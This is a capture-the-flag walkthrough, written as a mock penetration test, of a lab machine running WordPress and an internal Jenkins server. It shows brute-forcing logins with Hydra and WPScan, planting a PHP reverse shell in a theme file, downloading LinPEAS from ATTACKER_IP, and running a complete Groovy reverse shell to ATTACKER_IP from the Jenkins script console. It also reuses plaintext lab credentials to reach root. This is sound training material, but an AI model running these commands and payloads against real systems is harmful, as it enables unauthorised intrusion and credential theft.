# Internal (WordPress and Jenkins)

### **Internal** <a href="#id-6vsp2ao33lr5" id="id-6vsp2ao33lr5"></a>

### **Pre-engagement Briefing** <a href="#apw544k8e5fp" id="apw544k8e5fp"></a>

Client wants penetration test on environment due to be released to production in 3 weeks.

#### **Scope of Work** <a href="#id-3sqj5gdk4o4m" id="id-3sqj5gdk4o4m"></a>

* Conduct external, web app, and internal assessment of provided virtual environment.
* Minimal information provided about assessment - black box test.
* Secure user.txt and root.txt flags as proof of exploitation.

#### **Scope Allowances** <a href="#hcpj61x8ivv" id="hcpj61x8ivv"></a>

* Ensure tester's hosts file is modified to reflect internal.thm.
* Any tools or techniques are permitted.
* Locate and note all vulnerabilities found.
* Submit found flags to dashboard.
* Only IP address of tester's host is in scope.

[**Amend Hosts file**](https://docs.rackspace.com/docs/modify-your-hosts-file)

```
sudo nano /etc/hosts
```

Add entry for TARGET\_IP to resolve to **internal.thm**.

CTRL+X to save and exit.

### **Perform Nmap vulnerability scan (Active Scanning: Vulnerability Scanning (T1595.002))** <a href="#ntjqmorqrufx" id="ntjqmorqrufx"></a>

```
nmap -Pn -p- -sV --script=vuln -oN TARGET_IP_scan.nmap TARGET_IP
```

{% code overflow="wrap" %}
```
PORT STATE SERVICE VERSION
22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open http Apache httpd 2.4.29 ((Ubuntu))
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-enum:
| /blog/: Blog
| /phpmyadmin/: phpMyAdmin
| /wordpress/wp-login.php: Wordpress login page.
|_ /blog/wp-login.php: Wordpress login page.
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
MAC Address: 02:A1:1A:FB:45:B9 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
{% endcode %}

### **TCP/22** <a href="#u6jw4f3oy55l" id="u6jw4f3oy55l"></a>

#### **Attempt to connect anonymously (Reconnaissance: Gather Victim Host Information (T1592))** <a href="#id-6iezimp2jm2o" id="id-6iezimp2jm2o"></a>

```
ssh anonymous@TARGET_IP
anonymous@TARGET_IP's password:
Permission denied, please try again.
```

### **TCP/80** <a href="#id-13snuzqt0ag0" id="id-13snuzqt0ag0"></a>

#### **Perform GoBuster hidden directory scan (Active Scanning: Wordlist Scanning (T1595.003))** <a href="#ppjx67s4lgy3" id="ppjx67s4lgy3"></a>

{% code overflow="wrap" %}
```
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u TARGET_IP > gobuster80.txt

[SNIP]
/blog (Status: 301)
/wordpress (Status: 301)
/javascript (Status: 301)
/phpmyadmin (Status: 301)
/server-status (Status: 403)
[SNIP]
```
{% endcode %}

#### **Browse to website (Reconnaissance: Search Victim-Owned Websites (T1594))** <a href="#x1nv05u5o23y" id="x1nv05u5o23y"></a>

Displays Apache2 Ubuntu default page - misconfiguration vulnerability.

#### **Browse directories discovered by GoBuster (Reconnaissance: Search Victim-Owned Websites (T1594))** <a href="#gvstx9xxx0q8" id="gvstx9xxx0q8"></a>

/blog has search box displayed. Viewing page source displays comment that framework using "twentyseventeen" theme:

{% code overflow="wrap" %}
```
<!--[if lt IE 9]>
<link rel='stylesheet' id='twentyseventeen-ie8-css' href='http://internal.thm/blog/wp-content/themes/twentyseventeen/assets/css/ie8.css?ver=20161202' media='all' />
<![endif]-->
<!--[if lt IE 9]>
<script src='http://internal.thm/blog/wp-content/themes/twentyseventeen/assets/js/html5.js?ver=20161020'></script>
<![endif]-->
```
{% endcode %}

/wordpress displays "Oops! That page can't be found." message on WordPress page. Search box displayed.

/javascript displays forbidden page.

/phpmyadmin displays "Welcome to phpMyAdmin" page with "Log in" form.

/server-status displays "forbidden" page.

#### [**Identify WorpPress version**](https://kinsta.com/knowledgebase/check-wordpress-version/) **(Reconnaissance: Gather Victim Host Information: Software (T1592.002))** <a href="#z2icbiwchz77" id="z2icbiwchz77"></a>

View page source of homepage. Search for "?ver=". Version is 5.4.2

#### **Enumerate WordPress User IDs manually (Reconnaissance: Gather Victim Host Information: Software (T1592.002))** <a href="#gtkl59e1u7re" id="gtkl59e1u7re"></a>

Browse to "http://internal.thm/blog/index.php/wp-json/wp/v2/users/". "admin" user found.

#### **Perform**[ **WPscan**](https://www.kali.org/tools/wpscan/) **scan (Reconnaissance: Gather Victim Host Information: Software (T1592.002))** <a href="#tff21d6tlwd9" id="tff21d6tlwd9"></a>

```
wpscan --url http://internal.thm/wordpress --enumerate p
```

{% code overflow="wrap" %}
```
[SNIP]
Interesting Finding(s):
[+] Headers
| Interesting Entry: Server: Apache/2.4.29 (Ubuntu)
| Found By: Headers (Passive Detection)
| Confidence: 100%
[+] XML-RPC seems to be enabled: http://internal.thm/wordpress/xmlrpc.php
| Found By: Direct Access (Aggressive Detection)
| Confidence: 100%
| References:
| - http://codex.wordpress.org/XML-RPC_Pingback_API
| - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner
| - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos
| - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login
| - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access
[+] WordPress readme found: http://internal.thm/wordpress/readme.html
| Found By: Direct Access (Aggressive Detection)
| Confidence: 100%
[+] The external WP-Cron seems to be enabled: http://internal.thm/wordpress/wp-cron.php
| Found By: Direct Access (Aggressive Detection)
| Confidence: 60%
| References:
| - https://www.iplocation.net/defend-wordpress-from-ddos
| - https://github.com/wpscanteam/wpscan/issues/1299
[+] WordPress version 5.4.2 identified (Insecure, released on 2020-06-10).
| Found By: Rss Generator (Passive Detection)
| - http://internal.thm/blog/index.php/feed/, <generator>https://wordpress.org/?v=5.4.2</generator>
| - http://internal.thm/blog/index.php/comments/feed/, <generator>https://wordpress.org/?v=5.4.2</generator>
[+] WordPress theme in use: twentyseventeen
| Location: http://internal.thm/wordpress/wp-content/themes/twentyseventeen/
| Last Updated: 2024-01-16T00:00:00.000Z
| Readme: http://internal.thm/wordpress/wp-content/themes/twentyseventeen/readme.txt
| [!] The version is out of date, the latest version is 3.5
| Style URL: http://internal.thm/blog/wp-content/themes/twentyseventeen/style.css?ver=20190507
[...snip...]
[+] Enumerating Users (via Passive and Aggressive Methods)
Brute Forcing Author IDs - Time: 00:00:00 <==> (10 / 10) 100.00% Time: 00:00:00
[i] User(s) Identified:
[+] admin
| Found By: Rss Generator (Passive Detection)
| Confirmed By:
| Wp Json Api (Aggressive Detection)
| - http://internal.thm/blog/index.php/wp-json/wp/v2/users/?per_page=100&page=1
| Login Error Messages (Aggressive Detection)
[SNIP]
```
{% endcode %}

#### **Identify WordPress administrative logon URL (Reconnaissance: Gather Victim Host Information: Software (T1592.002)** <a href="#id-4dmnar6cv9ia" id="id-4dmnar6cv9ia"></a>

[**How to Find Your WordPress Login Url**](https://kinsta.com/blog/wordpress-login-url/)

> If you installed WordPress on a subdirectory (www.yoursite.com/wordpress/) or subdomain (blog.yoursite.com/), add one of the three paths at the very end of your URL such as: www.yoursite.com/wordpress/wp-login.php or blog.yoursite.com/wp-login.php

Default location is "/wp-login.php". This worked!

#### **Try to login to /phpMyAdmin using default credentials (Initial Access: Valid Accounts: Default Accounts (T1078.001))** <a href="#id-84ath6g7qydd" id="id-84ath6g7qydd"></a>

[Default phpMyAdmin credentials](https://stackoverflow.com/questions/5818358/phpmyadmin-default-login-password). Tried root:null - "Login without a password is forbidden by configuration (see AllowNoPassword)".

Tried root:root and root:password - "#1698 - Access denied for user 'root'@'localhost'".

#### **Try to login to WordPress using default credentials (Initial Access: Valid Accounts: Default Accounts (T1078.001))** <a href="#u78fdk7l2rk5" id="u78fdk7l2rk5"></a>

[Default Wordpress credentials](https://varyingvagrantvagrants.org/docs/en-US/default-credentials/) are admin:password - "Error: The password you entered for the username admin is incorrect. Lost your password?".

#### **Password guess WordPress login using Hydra method (Credential Access: Brute Force: Password Guessing (T1110.001)** <a href="#id-1u5a525ms5bp" id="id-1u5a525ms5bp"></a>

{% code overflow="wrap" %}
```
hydra -l admin -P /usr/share/wordlists/rockyou.txt TARGET_IP http-post-form "/wordpress/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2FTARGET_IP%2Fwordpress%2Fwp-admin%2F&testcookie=1:Error" -T 64 -vV
```
{% endcode %}

```
[SNIP]
[80][http-post-form] host: 10.10.9.105 login: admin password: my2boys
[STATUS] attack finished for 10.10.9.105 (waiting for children to complete tests)
1 of 1 target successfully completed, 1 valid password found
```

#### **Password guess WordPress login using WPscan method (Credential Access: Brute Force: Password Guessing (T1110.001)** <a href="#id-78dhzqpc8eog" id="id-78dhzqpc8eog"></a>

```
wpscan --url http://TARGET_IP/blog -U usernames -P /usr/share/wordlists/rockyou.txt
```

```
[SNIP]
[!] Valid Combinations Found:
| Username: admin, Password: my2boys
[SNIP]
```

#### **Upload reverse shell to WordPress (Privilege Escalation: Exploitation for Privilege Escalation (T1068))** <a href="#h6g51uj6m1j" id="h6g51uj6m1j"></a>

* Appearance > Theme Editor.
* Edit "404.php" from "Theme Files" list. Using this page reduces risk of reverse shell discovery as main theme still functions.
* Copy "php-reverse-shell.php" to working folder.

```
cp /usr/share/webshells/php/php-reverse-shell.php ~/Desktop/Internal
```

* Open copy of "php-reverse-shell.php".
* Edit "ip" field.
* Save and close file.
* Copy and paste code from reverse shell to top of "404.php" file in WordPress.
* "Update File" in WordPress to save changes.&#x20;

**Start netcat listener**

```
nc -lvnp 1234
```

**Launch reverse shell**

```
curl http://internal.thm/wordpress/wp-content/themes/twentyseventeen/404.php
```

**Reverse shell caught by listener**

{% code overflow="wrap" %}
```
Connection from 10.10.67.166 59196 received!
Linux internal 4.15.0-112-generic #113-Ubuntu SMP Thu Jul 9 23:41:39 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
16:57:28 up 15 min, 0 users, load average: 0.00, 0.01, 0.03
USER TTY FROM LOGIN@ IDLE JCPU PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
{% endcode %}

**Upgrade shell**

```
python -c 'import pty; pty.spawn("/bin/bash")'
```

**Find user.txt**

```
find / -name user.txt -type f 2>/dev/null

/usr/share/doc/phpmyadmin/html/_sources/user.txt
```

File does not contain flag.

```
cd /home
ls -la

[SNIP]
drwx------ 7 aubreanna aubreanna 4096 Aug 3 2020 aubreanna
```

No access to directory. www-data has no sudo delegation (**sudo -l**). No interesting cron jobs (**cat /etc/crontab**).

#### **Use LinPEAS to enumerate target host (Discovery: System Information Discovery (T1082))** <a href="#rw8nxw6nuooa" id="rw8nxw6nuooa"></a>

```
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
```

Serve payload through python webserver.

```
python3 -m http.server
```

Download LinPEAS to target host.

```
wget http://ATTACKER_IP:8000/linpeas.sh
chmod +x ./linpeas.txt
```

Ensure that target directory has write permissions. E.g. /tmp.

Write LinPEAS output to text file.

```
./linpeas.sh -a > linpeas.txt
```

LinPEAS found wordpress MySQL database credentials.

```
define( 'DB_NAME', 'wordpress' );
define( 'DB_USER', 'wordpress' );
define( 'DB_PASSWORD', 'wordpress123' )
```

LinPEAS found interesting "wp-save.txt" file in "/opt" directory.

```
-rw-r--r-- 1 root root 138 Aug 3 2020 wp-save.txt
```

Content of "wp-save.txt".

> Bill,
>
> Aubreanna needed these credentials for something later. Let her know you have them and where they are.
>
> aubreanna:bubb13guM!@#123

#### **Escalate privileges to aubreanna (Privilege Escalation: Valid Accounts: Local Accounts (T1078.003))** <a href="#w3hy9n2fw139" id="w3hy9n2fw139"></a>

{% code overflow="wrap" %}
```
su aubreanna
Password: bubb13guM!@#123
whoami
aubreanna
id
uid=1000(aubreanna) gid=1000(aubreanna) groups=1000(aubreanna),4(adm),24(cdrom),30(dip),46(plugdev)
```
{% endcode %}

Recover user.txt flag:

```
find / -name user.txt 2>/dev/null
/home/aubreanna/user.txt
```

LinPEAS found phpMyAdmin credentials in "config-db.php" file

```
/etc/phpmyadmin/config-db.php:$dbpass='B2Ud4fEOZmVq';
/etc/phpmyadmin/config-db.php:$dbuser='phpmyadmin';
```

#### **Attempt to login to "/phpmyadmin" using recovered credentials (Initial Access: Valid Accounts: Default Accounts (T1078.001))** <a href="#xmyl67xhqe2m" id="xmyl67xhqe2m"></a>

Success!

#### **Enumerate target host using LinPEAS run as aubreanna (Discovery: System Information Discovery (T1082))** <a href="#c7uh25zeetlb" id="c7uh25zeetlb"></a>

```
[SNIP]
AdminIdentities=unix-group:sudo;unix-group:admin
[SNIP]
2020-08-03+01:41:53.2887857950 /home/aubreanna/.sudo_as_admin_successful
[SNIP]
```

#### **SSH to target host as aubreanna ()** <a href="#id-2hxct6vdsikt" id="id-2hxct6vdsikt"></a>

```
ssh aubreanna@TARGET_IP
The authenticity of host '10.10.67.166 (10.10.67.166)' can't be established.
ECDSA key fingerprint is SHA256:fJ/BlTrDF8wS8/eqyoej1aq/NmvQh79ABdkpiiN5tqE.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '10.10.67.166' (ECDSA) to the list of known hosts.
aubreanna@10.10.67.166's password:
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-112-generic x86_64)
[SNIP]
```

".sudo\_as\_admin\_successful" file is empty :(

Contents of "jenkins.txt\` file:

> Internal Jenkins service is running on 172.17.0.2:8080

IP address is pingable from target host.

#### **Use SSH tunnel on attack host to expose Jenkins server via target host ()** <a href="#bnhrfsus25q8" id="bnhrfsus25q8"></a>

```
ssh -L 8080:172.17.0.2:8080 aubreanna@internal.thm
The authenticity of host 'internal.thm (10.10.67.166)' can't be established.
ECDSA key fingerprint is SHA256:fJ/BlTrDF8wS8/eqyoej1aq/NmvQh79ABdkpiiN5tqE.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added 'internal.thm' (ECDSA) to the list of known hosts.
aubreanna@internal.thm's password:
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-112-generic x86_64)
[SNIP]
```

Browse to[ http://localhost:8080](http://localhost:8080/) on attack host to access newly-exposed webserver.

[ ![image](<../.gitbook/assets/0 (2).png>)](https://private-user-images.githubusercontent.com/157394432/311325492-1ae1d8a9-97be-4325-a858-190ce26f7b77.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MTMyNjg3MDcsIm5iZiI6MTcxMzI2ODQwNywicGF0aCI6Ii8xNTczOTQ0MzIvMzExMzI1NDkyLTFhZTFkOGE5LTk3YmUtNDMyNS1hODU4LTE5MGNlMjZmN2I3Ny5wbmc\_WC1BbXotQWxnb3JpdGhtPUFXUzQtSE1BQy1TSEEyNTYmWC1BbXotQ3JlZGVudGlhbD1BS0lBVkNPRFlMU0E1M1BRSzRaQSUyRjIwMjQwNDE2JTJGdXMtZWFzdC0xJTJGczMlMkZhd3M0X3JlcXVlc3QmWC1BbXotRGF0ZT0yMDI0MDQxNlQxMTUzMjdaJlgtQW16LUV4cGlyZXM9MzAwJlgtQW16LVNpZ25hdHVyZT0wNjVjNjUzM2E5OTM3M2Y3NTYyNTZiZWY1YzA0MWE4MWVkNDUzOTk3NmI5NjdiMDkxODRkZTFkYWE2NjBjZDEyJlgtQW16LVNpZ25lZEhlYWRlcnM9aG9zdCZhY3Rvcl9pZD0wJmtleV9pZD0wJnJlcG9faWQ9MCJ9.JWDRajqn\_EapktSM5k0BHVaeMB-NEDy9e-MXM8fMU4s)

#### **Attempt to logon to Jenkins server using default credentials of admin / password ()** <a href="#dxe1thweckcd" id="dxe1thweckcd"></a>

"Invalid username or password".

#### **Attempt to logon to Jenkins server using Aubreanna's credentials ()** <a href="#ip45zw47fzx0" id="ip45zw47fzx0"></a>

"Invalid username or password".

#### **Attempt to logon to Jenkins server using using Hydra brute force ()** <a href="#h4m453bkgi07" id="h4m453bkgi07"></a>

Attempted to use default Jenkins username of "admin" as could not identify a more specific username through enumeration.

{% code overflow="wrap" %}
```
hydra -l admin -P /usr/share/wordlists/rockyou.txt localhost -s 8080 http-post-form "/j_acegi_security_check:j_username=^USER^&j_password=^PASS^&from=%2F&Submit=Sign+in:Invalid" -T 64 -vV
```
{% endcode %}

* \-l specifies username.
* \-P specifies password wordlist to use.
* \-s specifies port to connect to.
* \-T run 64 tasks in parallel.
* \-vV verbose mode and show login+pass for each attempt.

```
[SNIP]
[8080][http-post-form] host: localhost login: admin password: spongebob
[SNIP]
```

#### **Use vulnerable feature of Jenkins server to get reverse shell ()** <a href="#id-8zbmrf6ag1l7" id="id-8zbmrf6ag1l7"></a>

"Manage Jenkins" > "Tools and Actions" section > "Script Console".

Type in arbitrary[ Groovy script](http://www.groovy-lang.org/) and execute it on server. Useful for trouble-shooting and diagnostics.&#x20;

**Create listener**

```
nc -lvnp 8044
```

**Upload reverse shell to Jenkins server**

Use Pure Groovy/Java Reverse Shell[ revsh.groovy](https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76) to create reverse shell session back to attacker machine.

{% code overflow="wrap" %}
```
String host="ATTACKER_IP";
int port=8044;
String cmd="bash";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```
{% endcode %}

"Run" to execute script&#x20;

**Reverse shell caought by listener**

```
Connection from TARGET_IP 39982 received!
whoami
jenkins
id
uid=1000(jenkins) gid=1000(jenkins) groups=1000(jenkins)
```

**Upgrade shell**

```
python -c 'import pty; pty.spawn("/bin/bash")'
```

#### **Search for interesting text files ()** <a href="#t6pnn5n5j0hb" id="t6pnn5n5j0hb"></a>

```
find / -name *.txt -type f 2>/dev/null
/opt/note.txt
[SNIP]
```

**Content of "note.txt"**

> Aubreanna,
>
> Will wanted these credentials secured behind the Jenkins container since we have several layers of defense here. Use them if you
>
> need access to the root user account.
>
> root:tr0ub13guM!@#123

#### **Escalate privileges to root on target host ()** <a href="#sk2wna6kw1bb" id="sk2wna6kw1bb"></a>

```
su root
Password: tr0ub13guM!@#123
whoami
root
id
uid=0(root) gid=0(root) groups=0(root)
```

**Find root.txt flag**

```
find / -name root.txt -type f 2>/dev/null

/root/root.txt
```
